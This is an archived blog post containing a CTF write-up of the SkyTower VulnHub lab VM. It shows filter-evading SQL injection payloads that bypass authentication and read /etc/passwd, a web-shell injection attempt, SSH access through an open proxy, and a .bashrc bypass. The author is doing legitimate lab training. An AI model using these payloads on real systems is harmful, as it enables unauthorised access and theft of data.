
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>#!/slash/note</title>
  <meta name="author" content="Leon Jacobs">

  
  <meta name="description" content="foreword Recently, at a local Security Conference, @telspacesystems ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://leonjza.github.io/posts/3">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="#!/slash/note" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-44457032-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">#!/slash/note</a></h1>
  
    <h2>A checkbox unchecker's notepad</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:leonjza.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/07/17/climbing-the-skytower/">Climbing the SkyTower</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-07-17T18:20:12+02:00" pubdate data-updated="true">Jul 17<sup>th</sup>, 2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>foreword</h2>

<p>Recently, at a local Security Conference, <a href="https://twitter.com/telspacesystems">@telspacesystems</a> ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on <a href="http://vulnhub.com/entry/skytower-1,96/">VulnHub</a>, and was promptly downloaded and loaded into VirtualBox.</p>

<p>In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)</p>

<h2>starting off</h2>

<p>The very first thing to do was get the IP assigned by my home router to the VM. Loaded this up into a web browser and saw the skytower web page as per the screenshots in the vulnhub entry. The IP I got was 192.168.137.242.</p>

<p>The home page presented you with a login screen and a 2.5MB &lsquo;background.jpg&rsquo; image. Right in the beginning I was started off on the wrong path. I downloaded this background image and attempted to see if there was anything particularly interesting about it. Sadly, the answer to this question was a loud <em>NOPE</em>. I started dirbuster on the web interface and proceeded with a nmap scan of 192.168.137.242 after which I had to call it a night.</p>

<figure class='code'><figcaption><span>SkyTower Nmap results</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nmap --reason -Pn 192.168.137.242
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-07-17 18:32 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.137.242
</span><span class='line'>Host is up, received user-set <span class="o">(</span>0.0020s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 997 closed ports
</span><span class='line'>Reason: 997 conn-refused
</span><span class='line'>PORT     STATE    SERVICE    REASON
</span><span class='line'>22/tcp   filtered ssh        no-response
</span><span class='line'>80/tcp   open     http       syn-ack
</span><span class='line'>3128/tcp open     squid-http syn-ack
</span></code></pre></td></tr></table></div></figure>


<p>Next morning I reviewed the results and continued to poke around.</p>

<h2>learn all you can</h2>

<p>With the information gathered so far, I realized that the SSH (tcp/22) was explicitly filtered, however the squid proxy was open. I tried to telnet and use the CONNECT method to see if I was able to access the SSH service:</p>

<figure class='code'><figcaption><span>SSH Access via open proxy</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>telnet 192.168.137.242 3128
</span><span class='line'>Trying 192.168.137.242...
</span><span class='line'>Connected to 192.168.137.242.
</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
</span><span class='line'>CONNECT 127.0.0.1:22
</span><span class='line'>HTTP/1.0 200 Connection established
</span><span class='line'>
</span><span class='line'>SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
</span><span class='line'>^<span class="o">]</span>
</span><span class='line'>telnet&gt; quit
</span><span class='line'>Connection closed.
</span></code></pre></td></tr></table></div></figure>


<p>Great, soooo I can get access to the SSH service of needed. The dirbuster results showed nothing of particular interest, but it was worth a shot anyways. An important thing to note here is that I suspect I maxed out the disk space in the VM due to the access_log growing too big from the dirbust. This caused me numerous headaches and frustrated me quite a bit when I was testing. Anyways&hellip;</p>

<p>The next step was to poke around the web application. I personally really enjoy web hacking so this was probably the most fun of the whole CTF. The web page presented you with a simple form that would POST to <code>login.php</code>. 2 fields were posted: <code>email</code> &amp; <code>password</code></p>

<p>A natural reaction is to try and use a single quote in form fields as a quick and nasty check for potential SQL injection. A login attempt with a username of test and password <code>'</code> resulted in:</p>

<figure class='code'><figcaption><span>SQLi Reveal</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>There was an error running the query <span class="o">[</span>You have an error in your SQL syntax<span class="p">;</span> check the manual that corresponds to your MySQL server version <span class="k">for </span>the right syntax to use near <span class="s1">&#39;&#39;&#39;&#39;</span><span class="err">&#39;</span> at line 1<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Classic SQLi! Surprised I continued with simple login bypasses. None that I could think of out of my head appeared to work. Eventually I started to notice that some of the keywords that I was using were not appearing in the error messages. This hinted heavily towards the fact that there may be some form of filtering in place. Eventually, I put the request down in a curl command so that I can work with this slightly easier. To sample the keywords being removed:</p>

<figure class='code'><figcaption><span>SkyTower keyword removal</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --data <span class="s2">&quot;email=foo@bar&amp;password=&#39; OR 1=1#&quot;</span> http://192.168.137.242/login.php
</span><span class='line'>There was an error running the query <span class="o">[</span>You have an error in your SQL syntax<span class="p">;</span> check the manual that corresponds to your MySQL server version <span class="k">for </span>the right syntax to use near <span class="s1">&#39;11#&#39;&#39; at line 1]%</span>
</span><span class='line'>
</span><span class='line'><span class="s1">$ curl --data &quot;email=foo@bar&amp;password=&#39;</span>1 OR <span class="nv">1</span><span class="o">=</span>1#<span class="err">&quot;</span> http://192.168.137.242/login.php
</span><span class='line'>There was an error running the query <span class="o">[</span>You have an error in your SQL syntax<span class="p">;</span> check the manual that corresponds to your MySQL server version <span class="k">for </span>the right syntax to use near <span class="s1">&#39;1  11#&#39;</span><span class="err">&#39;</span> at line 1<span class="o">]</span>%
</span></code></pre></td></tr></table></div></figure>


<p>Ok, so no <code>OR</code>. Thats ok, we can substitute this easily with <code>||</code>.</p>

<figure class='code'><figcaption><span>SkyTower Auth Bypass</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>$ curl --data &quot;email=foo@bar<span class="err">&amp;</span>password=&#39; || 1=1#&quot; http://192.168.137.242/login.php
</span><span class='line'><span class="nt">&lt;HTML&gt;</span>
</span><span class='line'>      <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">&quot;height:100%; width:100%;background-image:url(&#39;background.jpg&#39;);</span>
</span><span class='line'><span class="s">                                background-size:100%;</span>
</span><span class='line'><span class="s">                                background-position:50% 50%;</span>
</span><span class='line'><span class="s">                                background-repeat:no-repeat;&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">        padding-right:8px;</span>
</span><span class='line'><span class="s">              padding-left:10px;</span>
</span><span class='line'><span class="s">        padding-top: 10px;</span>
</span><span class='line'><span class="s">              padding-bottom: 10px;</span>
</span><span class='line'><span class="s">                  background-color:white;</span>
</span><span class='line'><span class="s">                  border-color: #000000;</span>
</span><span class='line'><span class="s">                  border-width: 5px;</span>
</span><span class='line'><span class="s">                  border-style: solid;</span>
</span><span class='line'><span class="s">                  width: 400px;</span>
</span><span class='line'><span class="s">                  height:430px;</span>
</span><span class='line'><span class="s">                  position:absolute;</span>
</span><span class='line'><span class="s">                  top:50%;</span>
</span><span class='line'><span class="s">                  left:50%;</span>
</span><span class='line'><span class="s">                  margin-top:-215px; /* this is half the height of your div*/</span>
</span><span class='line'><span class="s">                  margin-left:-200px;</span>
</span><span class='line'><span class="s">                                &quot;</span><span class="nt">&gt;</span>
</span><span class='line'>   <span class="nt">&lt;br&gt;&lt;strong&gt;&lt;font</span> <span class="na">size=</span><span class="s">4</span><span class="nt">&gt;</span>Welcome john@skytech.com<span class="nt">&lt;/font&gt;&lt;br</span> <span class="nt">/&gt;</span> <span class="nt">&lt;/br&gt;&lt;/strong&gt;</span>As you may know, SkyTech has ceased all international operations.<span class="nt">&lt;br&gt;&lt;br&gt;</span> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<span class="nt">&lt;br&gt;&lt;br&gt;&lt;strong&gt;</span>Unfortunately, all international contracts, including yours have been terminated.<span class="nt">&lt;/strong&gt;&lt;br&gt;&lt;br&gt;</span> The remainder of your contract and retirement fund, <span class="nt">&lt;strong&gt;</span>$2<span class="nt">&lt;/strong&gt;</span> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<span class="nt">&lt;br&gt;&lt;br&gt;&lt;strong&gt;</span>Username: john<span class="nt">&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;</span>Password: hereisjohn<span class="nt">&lt;/strong&gt;</span> <span class="nt">&lt;br&gt;&lt;br&gt;</span> We wish you the best of luck in your future endeavors. <span class="nt">&lt;br&gt;</span> <span class="nt">&lt;/div&gt;</span> <span class="nt">&lt;/div&gt;&lt;/HTML&gt;</span>%
</span></code></pre></td></tr></table></div></figure>


<p>And success. We have made some progress :D Little did I know that I don&rsquo;t actually completely understand the progress made yet, but just keep this in mind :)</p>

<h2>climbing the tower and faling hard</h2>

<p>From the auth bypass results, we can see specific mention for users to SSH into the server. This particular user has a username <code>john</code> and a password <code>hereisjohn</code>. So lets try this.
I setup my <code>proxychains</code> install to use the http proxy available on the server (<code>http 192.168.137.242 3128</code>) and opened a SSH session through it:</p>

<figure class='code'><figcaption><span>SSH via Squid Proxy</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>proxychains4 ssh john@127.0.0.1
</span><span class='line'><span class="o">[</span>snip<span class="o">]</span>
</span><span class='line'><span class="o">[</span>proxychains<span class="o">]</span> Strict chain  ...  192.168.137.242:3128  ...  127.0.0.1:22  ...  OK
</span><span class='line'>john@127.0.0.1<span class="err">&#39;</span>s password:
</span><span class='line'>Linux SkyTower 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.54-2 x86_64</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Thu Jul 17 12:54:32 2014 from localhost
</span><span class='line'>
</span><span class='line'>Funds have been withdrawn
</span><span class='line'>Connection to 127.0.0.1 closed.
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>&hellip; ok. So we get a session, and are told <em>Funds have been withdrawn</em>, and get the connection closed. Not exactly what I hoped for. Thinking what could cause this behavior, my mind went on to things like a custom shell, <code>.bashrc</code> files (assuming the user has bash a a shell) etc. So, I figured there may be more users on the system and I should try get those credentials too. After all, we have a working SQL injection point.</p>

<h2>more sql injection</h2>

<p>So back to the SQLi point it was. Taking a wild guess, I assumed there is a <code>users</code> table, and the table will have a primary key of <code>id</code>. So, <code>john</code> may have id 1, and a next user have id 2. So I modified the query slightly:</p>

<figure class='code'><figcaption><span>SkyTower = filter</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --data <span class="s2">&quot;email=foo@bar&amp;password=&#39; || id=1#&quot;</span> http://192.168.137.242/login.php
</span><span class='line'>There was an error running the query <span class="o">[</span>Unknown column <span class="s1">&#39;id1&#39;</span> in <span class="s1">&#39;where clause&#39;</span><span class="o">]</span>%
</span></code></pre></td></tr></table></div></figure>


<p>Well I definitely didn&rsquo;t ask for the column <code>id1</code>, but from this again it was apparent that <code>=</code> was filtered along with <code>OR</code>. :| Ok, so we change the payload again:</p>

<figure class='code'><figcaption><span>SkyTower user enum</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --data <span class="s2">&quot;email=foo@bar&amp;password=&#39; || id &gt; 1#&quot;</span> http://192.168.137.242/login.php
</span><span class='line'><span class="o">[</span>snip<span class="o">]</span>
</span><span class='line'>&lt;br&gt;&lt;strong&gt;&lt;font <span class="nv">size</span><span class="o">=</span>4&gt;Welcome sara@skytech.com&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks <span class="k">for </span>your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;<span class="nv">$2</span>&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: sara&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: ihatethisjob&lt;/strong&gt; &lt;br&gt;&lt;br&gt; We wish you the best of luck in your future endeavors. &lt;br&gt; &lt;/div&gt; &lt;/div&gt;&lt;/HTML&gt;%
</span></code></pre></td></tr></table></div></figure>


<p>Yay, my guess on the <code>id</code> column was correct, and I now had a second users details. I continued to increment the <code>id</code>, and ended up with 3 accounts:</p>

<ul>
<li>john:hereisjohn</li>
<li>sara:ihatethisjob</li>
<li>william:senseable</li>
</ul>


<p>The users <code>john</code> &amp; <code>sara</code> both had the same behavior when attempting login via SSH, and the user <code>william</code> appears to have had an incorrect password. So, again the results were not exactly what I hoped for.</p>

<h2>more SQL enumeration</h2>

<p>At this stage, I was thinking there must be more information in the database, and I should try and read some files from disk in order to gain a better understanding of what is going on here.</p>

<p>Fast forward a few hours, I discovered that a few more keywords and symbols were filtered. The hardest being the realization that a <code>union select</code> was not working as expected so that I can enumerate the columns. Even though the initial entry on vulnhub mentioned that automated tools would probably not work, I figured in this case that I had a valid SQLi, I could just make use of some SQLMap automagic. Again <em>NOPE</em>. Even with <code>--level 3</code> &amp; <code>--risk 3</code> there was no joy. This is ok.</p>

<p>I studied the error messages in detail, googled&hellip; a lot&hellip; and eventually came across <a href="http://zoczus.blogspot.nl/2013/03/sql-injection-without-comma-char.html">this</a> blogpost, detailing a way to get a union working without the ability to use commas. I should also note that I managed to bypass the <code>SELECT</code> filter by using <code>SELECSELECTT</code> in the payload. Assuming that the filter was a simple <code>str_replace()</code>, this left me with <code>SELECT</code> after the pass.</p>

<p>For the sake of brevity I am not going to detail all of the methods I used in order to exploit the SQLi and get value out of it. I managed to learn that the database user used by the PHP application was root. The query used in <code>login.php</code> returned 3 columns. One particular payload of interest that uses the method in the previously mentioned blog post, was used to start reading files from the servers disk. More specifically, <code>/etc/passwd</code>:</p>

<figure class='code'><figcaption><span>SkyTower File Access</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --data <span class="s2">&quot;email=foo@bar&amp;password=&#39; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt load_file(&#39;/etc/password&#39;)) as c#&quot;</span> http://192.168.137.242/login.php
</span><span class='line'><span class="o">[</span>snip<span class="o">]</span>
</span><span class='line'>&lt;br&gt;&lt;strong&gt;&lt;font <span class="nv">size</span><span class="o">=</span>4&gt;Welcome 222&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks <span class="k">for </span>your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;<span class="nv">$2</span>&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: 222&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>john:x:1000:1000:john,,,:/home/john:/bin/bash
</span><span class='line'>sara:x:1001:1001:,,,:/home/sara:/bin/bash
</span><span class='line'>william:x:1002:1002:,,,:/home/william:/bin/bash
</span><span class='line'>&lt;/strong&gt; &lt;br&gt;&lt;br&gt; We wish you the best of luck in your future endeavors. &lt;br&gt; &lt;/div&gt; &lt;/div&gt;&lt;/HTML&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Reading the <code>/etc/passwd</code> revealed that there were no custom shells used for the users that were enumerated previously. O..k.. I also pulled the sources of <code>login.php</code> in order to understand what the deal with the filtering was:</p>

<figure class='code'><figcaption><span>SkyTower SQL Injection Filtering</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$sqlinjection</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;SELECT&quot;</span><span class="p">,</span> <span class="s2">&quot;TRUE&quot;</span><span class="p">,</span> <span class="s2">&quot;FALSE&quot;</span><span class="p">,</span> <span class="s2">&quot;--&quot;</span><span class="p">,</span><span class="s2">&quot;OR&quot;</span><span class="p">,</span> <span class="s2">&quot;=&quot;</span><span class="p">,</span> <span class="s2">&quot;,&quot;</span><span class="p">,</span> <span class="s2">&quot;AND&quot;</span><span class="p">,</span> <span class="s2">&quot;NOT&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$email</span> <span class="o">=</span> <span class="nb">str_ireplace</span><span class="p">(</span><span class="nv">$sqlinjection</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="nv">$password</span> <span class="o">=</span> <span class="nb">str_ireplace</span><span class="p">(</span><span class="nv">$sqlinjection</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
</span></code></pre></td></tr></table></div></figure>


<p>And as suspected. :)</p>

<p>One last thing that I tried, really hard, was to get a web shell on the server so that I can further explore the environment. This failed miserably. The closest I was able to get was:</p>

<figure class='code'><figcaption><span>SkyTower webshell fail</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --data <span class="s2">&quot;email=foo@bar&amp;password=&#39; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt &#39;&lt;?php print_r(shell_exec($_GET[cmd])); ?&gt;&#39;) as c into outfile &#39;/var/www/shell.php&#39;#&quot;</span> http://192.168.137.242/login.php
</span><span class='line'>There was an error running the query <span class="o">[</span>Can<span class="s1">&#39;t create/write to file &#39;</span>/var/www/shell.php<span class="err">&#39;</span> <span class="o">(</span>Errcode: 13<span class="o">)]</span>
</span></code></pre></td></tr></table></div></figure>


<p>This obviously alludes to the fact that the user MySQL is running as des not have access to write to the web folder. It was time to rethink what was going on here&hellip;
Oh yes, I obviously tried to just cat <code>/root/flag.txt</code>, but didn’t expect it to be <em>that</em> easy :D</p>

<h2>gaining further access</h2>

<p>After spending a really long time with the SQL injections, I decided to relook the SSH section. From the SQL injection that I learnt that there don&rsquo;t <em>appear</em> to be any custom shells in use, so the other thing this could be is a <code>.bashrc</code> with a <code>exit</code> command. I know its <code>.bashrc</code> because I saw the shell is <code>/bin/bash</code> from the <code>/etc/passwd</code>. I remember that I make heavy use of <code>ssh -t</code> to execute commands on the remove server, usually to setup multiple tunnels into a network, so I thought it will come in handy here.</p>

<p>For this case though, I though I&rsquo;d specify a <code>/bin/sh</code> as the <em>command</em> to run, hoping to not get caught in a <code>.bashrc</code> running:</p>

<figure class='code'><figcaption><span>SkyTower .bashrc fix</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>proxychains4 -q ssh john@127.0.0.1 -t /bin/sh
</span><span class='line'>john@127.0.0.1<span class="err">&#39;</span>s password:
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Woop! I was now logged in as <code>john</code>. I inspected the <code>.bashrc</code> file and saw that at the end there was:</p>

<figure class='code'><figcaption><span>SkyTower .bashrc exit</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo</span>
</span><span class='line'><span class="nb">echo</span>  <span class="s2">&quot;Funds have been withdrawn&quot;</span>
</span><span class='line'><span class="nb">exit</span>
</span></code></pre></td></tr></table></div></figure>


<p>&hellip; a exit. I simply removed the line. Now the almost obvious next step was to inspect and enumerate as much as possible. The most obvious thing that came to mind was privilege escalation as I was simply a normal user on the system at the moment.</p>

<h2>enumeration enumeration enumeration</h2>

<p>I enumerated, everything&hellip; Referring to a excellent <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">post by g0tm1lk</a> nothing aparent came up. The only semi strange thing was a empty <code>/accounts/</code> directory:</p>

<figure class='code'><figcaption><span>SkyTower accounts</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>john@SkyTower:/accounts<span class="nv">$ </span>ls -lah /accounts/
</span><span class='line'>total 8.0K
</span><span class='line'>drwxr-xr-x  2 root root 4.0K Jun 20 07:52 .
</span><span class='line'>drwxr-xr-x 24 root root 4.0K Jun 20 07:52 ..
</span></code></pre></td></tr></table></div></figure>


